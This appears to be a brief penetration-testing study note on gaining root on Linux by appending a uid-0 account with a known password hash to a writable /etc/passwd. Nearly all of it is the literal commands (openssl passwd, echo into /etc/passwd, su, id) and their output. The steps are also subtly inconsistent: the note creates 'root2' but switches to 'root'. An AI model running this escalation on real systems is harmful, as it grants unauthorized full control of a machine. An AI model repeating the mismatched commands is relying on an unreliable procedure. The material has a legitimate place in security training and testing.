Linux PW generally stored in:
**/etc/shadow** Not readable by normal users

Historically, PW hashes and account info stored in world-readable:
**/etc/passwd**

For backwards compatability, if a pw hash is in the 2nd column of **/etc/passwd**, it's valid and takes precedence over entry in **/etc/shadow**. 

This means if we can write into **/etc/passwd**, we can set a pw for the account.

Generate a pw hash with **openssl** and the **passwd** argument:
`openssl passwd evil`

Add the entry for superuser root2 to **/etc/passwd**:
`echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd`

Assume su privs:
`su root`
Password: evil

Check:
`id`
uid=0(root) gid=0(root) groups=0(root)